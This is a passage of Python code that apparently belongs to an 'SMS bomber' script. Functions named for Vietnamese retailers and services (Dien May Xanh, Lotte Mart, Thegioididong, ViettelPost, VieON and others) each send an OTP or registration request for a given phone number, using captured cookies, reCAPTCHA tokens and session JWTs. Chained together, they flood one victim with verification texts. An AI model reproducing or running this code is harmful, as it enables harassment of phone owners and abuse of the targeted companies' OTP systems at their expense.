DMX_Personal=%7B%22UID%22%3A%22e6d94a3534afc480fc6ea91ef010a096bb76d1e9%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; ___utmvc=navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dfalse,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=; _gcl_au=1.1.1138012301.1745997153; _ga=GA1.1.1060106111.1745997153; __uidac=016811cd611fe7511ea21435c5ee2a96; __admUTMtime=1745997153; _pk_id.2.8977=5ebe289a070352aa.1745997153.; _pk_ses.2.8977=1; __iid=; __iid=; __su=0; __su=0; _fbp=fb.1.1745997154121.12996446599693872; __RC=25; __R=1; __uif=__uid%3A3983381182884385417%7C__ui%3A-1%7C__create%3A1745558338; chatmode=0; SvID=new2690|aBHNZ|aBHNY; _ga_Y7SWKJEHCE=GS1.1.1745997153.1.1.1745997155.58.0.0",
    }
    data = {
        "phoneNumber": phone,
        "isReSend": "false",
        "sendOTPType": "1",
        "reCaptchaToken": "03AFcWeA5Uym5RH2GPHIv4_E7qAPm5vP5mQtmjHVj88cYM-HNO4RHTcsa6cx20Ph6HCAQiCqIWPkEDOFAtzS77MgB6vbWzHNhzaGAMHD_h8qDw_AAsJuNalhnTS6hqfaD98lhjuzeP2LeGAfSB4w_WUSOftv3RL8apSptqpNOBBfwS_PJWJOzCBuzR6eWgE_j4bvF7hGL5483a5zkMb_6ggdM5IxerEmGwsaB7oIdOY2uPVRyrqsqiV0NLRWfPu0aK6WorWUzHfG_LC6qu0Py0XxpSvmr9NUb5L5lXuiMJXGDOF2ZwySsVQ56KM1DRCjd2FaLq5d8rrQub9ekwCQ3V2_rdjyZF_h4bGCv4fF1w6FiXAF-faHAC8ZBga2a8Pn3rBzrk-zZX_-gTZpn71GOyTsaHd9_OeTvPzZ2a0tTm2PC4vmY_nDyExNilruSZDQuNrOX6jJC9aawLMsFRK1ZcBqKEN6flROJ6X4TH1lZy0-JUG6y1TDI2WMZMqwBB6VPiIQxZBd7qLSake8B-Oc9_C3b78-PWZT9P6y-DfGBw9gIY8KXdQpshQn4EbqiI0UqAnujVRK7CNllj_SK577BAg7lQc_9ouPlx3CCqagummTmnw5PbORcv3EPDqKOE-CR_LZluuheiURNxKfTJo7POtxgt3-0B6Kgp2CBXC4D5sxLiKLYFjB81aWea8DTlMHr8aNzeuGiJ0adF2two3LxXYfxXXVTUIf4P98eE1s1Jh0ISetrkS2HQRnsIsloXYUBgNt71c260PQaZl4kcWlS27cmFLhcsBLqVwa5EsI9LuOq8AqRyOdrZuCHDEIEQhpBem8NfcSIUTDqhCpsS56xuB46b5Pq4kk5xcVB5axZxWHzf9iwdflyZuYTlF5uW2_LmgK5N8KRc9DLwTeWcN6X1TTBoieiFmJE7jTfarM62TyVbwvLZ2DWo7FAJWJkps0flhLiWWALi512oIKNL2qHcqaDIj2Z79e7zXLov_vb9E_5MHRiNLP44JdxFACiNx4fvnbuqKY83CEyW",
        "reCaptchaTokenV2": "",
        "socialToken": "",
        "socialType": "",
        "__RequestVerificationToken": "CfDJ8DeM8It-JwlAhxpbhi7u5Q_JC6FgmT1PiVg9etA3FaIA3zdpLfRbB5FxYW_aTDCUimWRXmg-BlEN7cGcU_ByalaiIJXTkw-DXLxqD47w3d4xBsiRMniGoO_lZXa3iddVzLCG-H4bcHN0S-FkyPM0QUg",
    }
    response = requests.post(
        "https://www.dienmayxanh.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def kingfoodmart(phone):
    headers = {
        "domain": "kingfoodmart",
        "x-ol-thumbnail-height": "250",
        "sec-ch-ua-platform": '"Windows"',
        "Referer": "https://kingfoodmart.com/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "accept": "*/*",
        "x-ol-thumbnail-width": "250",
        "content-type": "application/json",
    }
    json_data = {
        "operationName": "SendOtp",
        "variables": {
            "input": {
                "phone": phone,
                "captchaSignature": "03AFcWeA7R4-UvV29jYoF3u1O6HEmJkrEXrmlWAtiYBCkLpPm7j1iuCsfBmqNUG7wG20lyIoracCakH5Wh-t81xWmzPEiAPwJCq1Xo5gVrj_sjY8RYYYWGZVFP9r-6kTmbXcSbPmNdmcwCvQ72wAyk2tifcqIUCTVoNeZ-P7AE5jninzGJb26Y78pnr09Z7-004vwOEIaz5T_ucBo-Qj7HJUT1nwn80MwGvGgn9g-BWC-vcKEY_LzJTbe90YSsWmONdvB-uxEy3XmoXJjynL0eWfO8dQM0olXkTr9sWl1qUPbdxCV_QcKeG0CBP_GTqoMnDqHFtyrXMkXmb2bjSP4lP_XdBD-SBnvAV2A5caiuXrSv_0taqKYttnmb8PR6wrZY7P0zAyUoyuGxim06Xl2E4gOP9tP1tfD5yU0Lr2gocTB2EVAHTpPXc9OPGo30uObbjHjymZDds_czqWFkbDlTVi9dSX-I1ryMbNykkGzyUExQSDE-VEAKIcdIbVVhGxHFt5PKcV9Jlnqv6gIq_kwfJphNLM_ttJNLUZThY6dTqFy3ziwwxHKewzAcO071UcwXLAMHavsyO4u0AuaFK-CpiAY_6GhrPHTXpESlKCQpOtmw2LAtm1QO0sk3ZyxYaGjavJXC8rIYBolqXB6xjVwaBzpqKvyJ1h0uV2blVpiEPdaUoGLGNy0fGIHC-wiEgxuEsSmmpFV8DThA1n-ffvyElgsAqlmPuxW9sthapibuhGizpZgbREqlYfNNJfilRi9PqAOtJiXfXjmaeFuGDTYcyyEtTcTHg19yOY7gZ6bzoQTKie0xeAx-WQLGzIgUG0VX6_v0pm2mbFD6u87SPBONx5FlCvXr59FBPrlS12PEG8xuBcOtL4gSFR8MhxpAtcHLXEFxKz1W9pKG_xMOv9216m11IpNhxxc8ofR7FM_cS4qrRPOA5PIE1LEz7KsSza81f-ChFq8UVRaEvtGwMKGqHboIqtP5Bd--uBkIpKDU3VOeJ2FO88KF6CxunQmtPGOGh4YJgMx6n3ImAXSi1Zy_memFEYudyqYFuJ5EhjsYg8fYrX6KjhpADQLD4jz9g8OtfrlG0QXavgAAOiyK-3EjXNqY-JOuKc5qqyr4AV4x44hJ1YmR32uN_1XW9w7P477UWrA-PGQbxWZEKbS9tvuFX2lo2O2T18c7Ktt-mv73k5k_u5JBfPQYdQHMT2wBSV9duIb5WtGQtoJi5TGhITyNgQ_uMFe0i8gLD-3m13FrztVh9GWPe5Siy8ubdhsry9wAICrrHPkVeAYUI9rUgUnkQZvrzB_2qwBWzBGs8_TRevDWYsYc8lhu4hSM5ArwCYDQZlJ-iyByYp7DfnBNE6zwDfFKzxD78d4Pc4WzndZVr3mlTvqu32uWcDLa2DckqnM-pBqxXGBLhTe3WS-8t1ctyl2WXiw3VAGCsY6etm2Ufg_KVXa40pF_Eke774ttL_5dcgXWPB9JTAfxzE_OimmrTQrOMYzgDtDsrII0p94E4BbMI3yAQEiAh0QqP0tEezz55z2qwMKXyalylVcQNR7TQgneImu2EAQJAjcxABv3_u8ym0DlFbY_ocdNa5GtWI2yAd_wVTVibBqMVIlbrH28B5fEIoGCBoK7XRyHjeDRDCSI3OfEMQqBG9Qz1UBKI_WZLdrKDR2l1pAR5jtdlTaYFtWBnb7dasRYZ1MUIeOvW6KbCK9lSAb7Ie407CQEs8zkv7T6YIbS6Xn2FgnfJRk6aU6Yd0KrQbIEuI2Ug2FI22-JJmlsgzCby-5-IUM6_iVqVVvmVxDwrh6OjBhup0SRWbCEpTZptlVM_RDGw8BwFCqqP9pOLo3X6F2i_w-32al9-QiIMgTukS2XsejS_pp4ZnqpkLsnKLPtwPevDtDjnbvlrUOTHPr_5XlSn6sxikaSVEphx5CNS2Dkg6x0VFHpMvRladiLLNwvbixumLEFN3Tf3VBnjAhMSR0XmriGRaTJ9FZY98Z4RReFo58SYCqmBOcsgQXNkPGfDD79CJKZdroZLn16Z6Zfezqtrk35D92tXgvZYm8Uihc25WA2HT0tcMhCyJhtA1ZOkGscCOcdFiIJoW-Y-emEgQR5zI8O_AKLMQjMDOhxbtV9w7H2SkphDer1Y0jJ78fCWg",
                "method": "ZALO",
            },
        },
        "query": "mutation SendOtp($input: SendOtpInput!) {  sendOtp(input: $input) {    otpTrackingId    __typename  }}",
    }
    response = requests.post(
        "https://api.onelife.vn/v1/gateway/", headers=headers, json=json_data
    )
def mocha(phone):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        # 'Content-Length': '0',
        "Origin": "https://video.mocha.com.vn",
        "Referer": "https://video.mocha.com.vn/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    params = {
        "msisdn": phone,
        "languageCode": "vi",
    }
    response = requests.post(
        "https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp",
        params=params,
        headers=headers,
    )
def vieon(phone):
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDYxNzAzOTMsImp0aSI6ImYwZWI3MzFmZTFhMTQzNTZiNjI4NGI1NzVhZTIwNGIwIiwiYXVkIjoiIiwiaWF0IjoxNzQ1OTk3NTkzLCJpc3MiOiJWaWVPbiIsIm5iZiI6MTc0NTk5NzU5Miwic3ViIjoiYW5vbnltb3VzXzhjYTZhNWQ2ODVjZjQyMTBlMjRhYjZmZmU0NmNhMjI0LTZiNGU2MWVjODAxYjgxOTljMDRmNGYzODA1MmM2ODEwLTE3NDU5OTc1OTMiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiOGNhNmE1ZDY4NWNmNDIxMGUyNGFiNmZmZTQ2Y2EyMjQtNmI0ZTYxZWM4MDFiODE5OWMwNGY0ZjM4MDUyYzY4MTAtMTc0NTk5NzU5MyIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiZHQiOiJ3ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IldpbmRvd3MgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.wu0CHdId_huSUMeBRyrkp5fNnRSVbxkzDewF9BfdMEg",
        "content-type": "application/json",
        "origin": "https://vieon.vn",
        "priority": "u=1, i",
        "referer": "https://vieon.vn/auth/?destination=/&page=/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    }
    params = {
        "platform": "web",
        "ui": "012021",
    }
    json_data = {
        "username": phone,
        "country_code": "VN",
        "model": "Windows 10",
        "device_id": "8ca6a5d685cf4210e24ab6ffe46ca224",
        "device_name": "Chrome/135",
        "device_type": "desktop",
        "platform": "web",
        "ui": "012021",
    }
    response = requests.post(
        "https://api.vieon.vn/backend/user/v2/register",
        params=params,
        headers=headers,
        json=json_data,
    )
def lotte(phone):
    cookies = {
        "__Host-next-auth.csrf-token": "aad9ef2622f3686a1b29c005a968fe522782b3139e856c5535a6837b59e43f93%7Cd9014825dbea56a28b475d9b0eed107b63fbd59ce9d94f021e4da40d9072b486",
        "__Secure-next-auth.callback-url": "https%3A%2F%2Fwww.lottemart.vn",
        "_ga": "GA1.1.758687210.1746086161",
        "_ga_6QLJ7DM4XW": "GS1.1.1746086161.1.0.1746086161.60.0.0",
        "_gcl_au": "1.1.1591328187.1746086161.437253800.1746086161.1746086161",
        "_fbp": "fb.1.1746086161768.71227929277722508",
    }
    headers = {
        "accept": "application/json",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/json",
        "origin": "https://www.lottemart.vn",
        "priority": "u=1, i",
        "referer": "https://www.lottemart.vn/signup?callbackUrl=https://www.lottemart.vn/",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "x-appcheck-token": "eyJraWQiOiJEX28wMGciLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjcxMjk3MTkwMDMyOTp3ZWI6YzdiZDdmODk3NTY4YWQ5ZjhjMjBiOCIsImF1ZCI6WyJwcm9qZWN0c1wvNzEyOTcxOTAwMzI5IiwicHJvamVjdHNcL2xvdHRlbWFydC0zODMzMTIiXSwicHJvdmlkZXIiOiJyZWNhcHRjaGFfdjMiLCJpc3MiOiJodHRwczpcL1wvZmlyZWJhc2VhcHBjaGVjay5nb29nbGVhcGlzLmNvbVwvNzEyOTcxOTAwMzI5IiwiZXhwIjoxNzQ2MTcyNjAwLCJpYXQiOjE3NDYwODYyMDAsImp0aSI6InBpNnhQRnhUazJTOGRBMmY3OUpHNXZ3Wmk4LVFtM0xVdVZwd3pYZDNac0UifQ.eMXTYp_UJiTguBjOQDCE25VaWzsbitVFvTUBeMa6qnD1kVs-FyTPybboxU9fdPllev4Dd_mAqYNJOFzvbkN-G_hBQb7XEarm4c9j6dsJ8973h4ONS2GuI_nM2DMBupz0HKw0xkDZS7Wtzroq-Umv8xCE3sbqEG7iyNiWyn-6Rip9UhBdxliL-GqJxQmIPrnd3EqUH2oitFWzqWV8_BeK_lJa2wkbqDR3JE7VuqwtpEuk8WdJqBSQZlFrNr1YPTTCRx7wZiM5oxDxkr25XIF2HfJWO1OmUlTSi-oeHC78UnXWAhKNYhAyze505cLuCOGXVfel5vQpVAzRmOovEQbZisocnnsPBbuDcFpW_hwEpjLyU1hfB6Sh_z0FtR75EOgjEz6FE3xZlRAply4lOvQW2ZHbFI17menW0Wm_c5P4KJYuHKyTRp9vGdSHm50swjdJV64gM9dXUe1Jn1LNvPQFN0MbKBNGBMZC9CeXAD4la6SMn_dcUwSockxwkm7BOsdG",
        # 'cookie': '__Host-next-auth.csrf-token=aad9ef2622f3686a1b29c005a968fe522782b3139e856c5535a6837b59e43f93%7Cd9014825dbea56a28b475d9b0eed107b63fbd59ce9d94f021e4da40d9072b486; __Secure-next-auth.callback-url=https%3A%2F%2Fwww.lottemart.vn; _ga=GA1.1.758687210.1746086161; _ga_6QLJ7DM4XW=GS1.1.1746086161.1.0.1746086161.60.0.0; _gcl_au=1.1.1591328187.1746086161.437253800.1746086161.1746086161; _fbp=fb.1.1746086161768.71227929277722508',
    }
    json_data = {
        "username": phone,
        "case": "register",
    }
    response = requests.post(
        "https://www.lottemart.vn/v1/p/mart/bos/vi_nsg/V1/mart-sms/sendotp",
        cookies=cookies,
        headers=headers,
        json=json_data,
    )
def tgdd(phone):
    cookies = {
        "_gcl_au": "1.1.929628718.1744201143",
        "_fbp": "fb.1.1744201146500.407781687620634076",
        "_tt_enable_cookie": "1",
        "_ttp": "01JRD7TR7TGHYT2BG05DP2VWZF_.tt.1",
        "_pk_id.1.8f7e": "8c5927c2f87b4dd7.1744201148.",
        "_ce.s": "v~1c7e876cc8e0eb39aaf69e29ca3ae18c5692e58d~lcw~1744201935000~vir~new~lva~1744201144706~vpv~0~v11.cs~453625~v11.s~062b3a50-153d-11f0-adc2-e9915eb3b75d~v11.sla~1744201425974~v11.fhb~1744201368941~v11.lhb~1744201995004~lcw~1744201995006",
        "TBMCookie_3209819802479625248": "255219001746086414Z+Qz0DFM8uKcqkCxQQYwtfyeKoo=",
        "___utmvm": "###########",
        "DMX_Personal": "%7B%22UID%22%3A%22c7a1a4e0026471665ff68fb1951efe467d0cf69f%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D",
        "mwgngxpv": "3",
        ".AspNetCore.Antiforgery.Pr58635MgNE": "CfDJ8HjlFm50bqhDkXgTFR2ID0qq_XGTVhBVT8FB7BKpotMqi4eoUlUkceJevagyugTuCPCHXLK-96V0YfCIRzn2miKmM5MLuu-I350LLVWqYKuGb_d2Cv9ybhE-lbeY2AL29f4a4sya49yg8NoaNNqHiqQ",
        "_ga": "GA1.2.1787420372.1744201144",
        "_gid": "GA1.2.1801075880.1746086417",
        "_gat": "1",
        "_ga_TZK5WPYMMS": "GS1.2.1746086418.1.0.1746086418.60.0.0",
        "_ga_TLRZMSX5ME": "GS1.1.1746086417.2.0.1746086419.58.0.0",
        "ttcsid": "1746086420473::6Imx-3_rQetDp-_74vdB.2.1746086420473",
        "_pk_ref.1.8f7e": "%5B%22%22%2C%22%22%2C1746086421%2C%22https%3A%2F%2Fwww.google.com%2F%22%5D",
        "_pk_ses.1.8f7e": "1",
        "MWG_ORDERHISTORY_SS_1": "CfDJ8HjlFm50bqhDkXgTFR2ID0pzuomSygYkUZ0MEu0K12%2BCfHKbyR9QJExN7GxgGKboKOt6Fjwx0TPC%2Fz5z7XoxzM0D%2Fd%2BI0ZkG%2F3nWskQib4FbbVWV0hlD41VSCNOcmAzAC6xM9beEr6OdatrL9Xv97bEJLdodaStc6ZlkcALyxiEV",
        "_oauthCDP_WebTGDD_Production": "2EICzzDZp6kF5eMW_uhQiOz_0DxH5GC_LHCO9j0FJtDD9YhakuY2GLBdLyPhGGRlkhHMJFVEH5vvTl9xxPxXuQmzEP1Vckle5O6b5jj7Wk1Wz39IMjKdbjqHXGoskDK2qDjtKjeBBKtktqfNeaXdAoermg94J2bvdVrmg94BiJ82fKnnWBO4_y9b4udd6pvGYXXL8vn3iFHJtcDppPJCtlBNSfkMvR7I4pVWUPTBjgEbUZMgZoFrmg94EW4ItZ90llGNW5jlYC7FqSBSDsfFZsdvLS5atK8rmg941kLH4c4pvS8srmg94YNzTHnoE4f3J7l4otbWxNoPaU_IgDwJCe8fastOYAy910O87NUJDnrmg943qnWSumdf4v5pGVajvuhGiEmAQsMWoydpXrmg94IVIbEXGQXRTwzcHVpykLNBc4mb37rlG56rmg94sJzZ",
        "SvID": "beline26121|aBMqK|aBMqE",
        "ttcsid_CANVQ2RC77UFDAKT9FD0": "1746086420472::idCBXSsJ--3LtozKVHWt.2.1746086460184",
    }
    headers = {
        "Accept": "*/*",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Origin": "https://www.thegioididong.com",
        "Referer": "https://www.thegioididong.com/lich-su-mua-hang/dang-nhap",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    data = {
        "phoneNumber": phone,
        "isReSend": "false",
        "sendOTPType": "1",
        "reCaptchaToken": "03AFcWeA4i4Fw_kEY5bqypgJo4ZnmhmJghRJcriJd_Ika4SB5gVlzRsJ1CHc5z4aAK8XiDgOEmJchKIM6GPRn-Wa8uk21rKZnNNFRKlFF4mZeVHKlc1l47D11KAJGiaEYu3rIlJgikLOhJWfti83o_re9CZT-QWOweBK9IwDXLHLU6L2GDTk7op4pUtz7TEHb4A1sYouwaOpjbveTLc1-GXss5b6ztuyReTAotj5Dcpr0c_9bZ8sGHuANDI-VqVFoqVxFP4j7wcasFo17I0vXTVPA7PPuJsYgt2JZGfNk1KZoOqm_P9903Lo8m2pXOns5jQftunxpc0QgFciriZS8h-eU_SML8GNFhlZ6qmw-kEUgvkWx17WjyIlgrowcjZ3ojVBLUvSuDAzEJKKfDjVa49BfKNLHt_DdFkUmljHxtCKPf3kwJdUWXtl-oAcqqrsEGpniH-g28Xhk3s7njOW4UFkNVlp4tcANT7YPKFf4ZWot5u-z_mZOTHI8Am2uhhj5wMM9_PtgTC8mMLBxC4io7sWLG_iJXgEeerW1Ez1V9O-gaAtTn2BUmB-Fu-do-38Br5sEvnCa1vezhPoEYPgP_ZVv2B13-5OjD_UT8n_xjso67y8JspSi1oKQmWQnTiONfB3hjaZcio-ngatXGDBI3htxRF2BmAHCtQpnh2LeupljnJbXlW-lDpJHE65iUWKE-CqpGvCG4S-kot2M7OhxlRLUCFsWkkxfIFSEGK-b6_TSU1BViVr-HQex5IjgfJkxlNT2i2iEg9R4xTg7YjGlgBGq0cJ67A4MZPnKZCs06XUoP0XLIbs2fFhPhGPzqgP2SIHYIbxUTw-YDzBwkkf__-zpGlGDYxK1WTdi0xq-dtTytYKhOsWb2OscwWWMeI-wBJiJziX-BXhVzsHnTJE7pg7Un_PjOtB-qvAHK75Afinbk8MaSwmMSRtI52bnf-F35Zx9Zu6Un_QrxNcTZrJYBLw7lGJi1CZQ1a04c5ryH-dg2vjBfjQzSiQjwuQwymUhXSo2xttKxbcea",
        "reCaptchaTokenV2": "",
        "socialToken": "",
        "socialType": "",
        "__RequestVerificationToken": "CfDJ8HjlFm50bqhDkXgTFR2ID0rg889HQEe966xPzi48j8Nnklgu1bPx9lZqx-0RiKJs4nrS11nKVr_1CHAbPihx5TiXX0iHYW-ybcuc8Xekf899TzsWoP2JB52DGt0TwhQRke1YKcYT-nz8N2rhcSQS-IM",
    }
    response = requests.post(
        "https://www.thegioididong.com/lich-su-mua-hang/LoginV2/GetVerifyCode",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def viettelpost(phone):
    cookies = {
        "_gid": "GA1.2.1664590281.1746086657",
        "_gat_gtag_UA_128396571_2": "1",
        "QUIZIZZ_WS_COOKIE": "id_192.168.125.23_15001",
        "_ga_L7ZKY279LR": "GS1.1.1746086660.1.0.1746086660.0.0.0",
        ".AspNetCore.Antiforgery.XvyenbqPRmk": "CfDJ8Pv1EAmKjcZHptazQUm4j4sPCB6574vVAW4hBTj8ZtMC4FgwMizdvyyMI3YJsJ98NYcTP1Ckaqwv2WsLOOo56XuSVui41hrNIegEZjA42Ix-0HTo8n7C5ViegI5sdFNShvVvN2aNpXF0SmprZTNWAlI",
        "_ga_9NGCREH08E": "GS1.1.1746086656.1.0.1746086660.56.0.0",
        "_gat_gtag_UA_146347905_1": "1",
        "_gat_gtag_UA_142538724_1": "1",
        "_ga_7RZCEBC0S6": "GS1.1.1746086663.1.1.1746086665.0.0.0",
        "_ga_WN26X24M50": "GS1.1.1746086663.1.1.1746086665.0.0.0",
        "_ga": "GA1.1.1826266576.1746086657",
        "_ga_P86KBF64TN": "GS1.1.1746086664.1.1.1746086680.0.0.0",
    }
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "null",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
        "sec-ch-ua": '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        # 'Cookie': '_gid=GA1.2.1664590281.1746086657; _gat_gtag_UA_128396571_2=1; QUIZIZZ_WS_COOKIE=id_192.168.125.23_15001; _ga_L7ZKY279LR=GS1.1.1746086660.1.0.1746086660.0.0.0; .AspNetCore.Antiforgery.XvyenbqPRmk=CfDJ8Pv1EAmKjcZHptazQUm4j4sPCB6574vVAW4hBTj8ZtMC4FgwMizdvyyMI3YJsJ98NYcTP1Ckaqwv2WsLOOo56XuSVui41hrNIegEZjA42Ix-0HTo8n7C5ViegI5sdFNShvVvN2aNpXF0SmprZTNWAlI; _ga_9NGCREH08E=GS1.1.1746086656.1.0.1746086660.56.0.0; _gat_gtag_UA_146347905_1=1; _gat_gtag_UA_142538724_1=1; _ga_7RZCEBC0S6=GS1.1.1746086663.1.1.1746086665.0.0.0; _ga_WN26X24M50=GS1.1.1746086663.1.1.1746086665.0.0.0; _ga=GA1.1.1826266576.1746086657; _ga_P86KBF64TN=GS1.1.1746086664.1.1.1746086680.0.0.0',
    }
    data = {
        "FormRegister.FullName": "sdjfhs jdfjk sd",
        "FormRegister.Phone": phone,
        "FormRegister.Password": "97XSV3eC#D$Ai#r",
        "FormRegister.ConfirmPassword": "97XSV3eC#D$Ai#r",
        "ReturnUrl": "/connect/authorize/callback?client_id=vtp.web&secret=vtp-web&scope=openid%20profile%20se-public-api%20offline_access&response_type=id_token%20token&state=abc&redirect_uri=https%3A%2F%2Fviettelpost.vn%2Fstart%2Flogin&nonce=um6mvohlarlxec05vmyxi",
        "ConfirmOtpType": "Register",
        "FormRegister.IsRegisterFromPhone": "true",
        "__RequestVerificationToken": "CfDJ8Pv1EAmKjcZHptazQUm4j4thmgDGLS6mg8snxx4l_oKx6UGZuF26yw3_UvNdVF0wgsHSLTzspXmcpY8R3kGO3YixAbNxWUkqpovz_jPiJjOBG8zo7ZaPNp9C6ZFAiWk2L4FvbdkJWOuiJF38Ms4fcPA",
    }
    response = requests.post(
        "https://id.viettelpost.vn/Account/SendOTPByPhone",
        cookies=cookies,
        headers=headers,
        data=data,
    )
def vuihoc(phone):
    cookies = {
        "VERSION": "1",
        "WEB_LOP": "1",
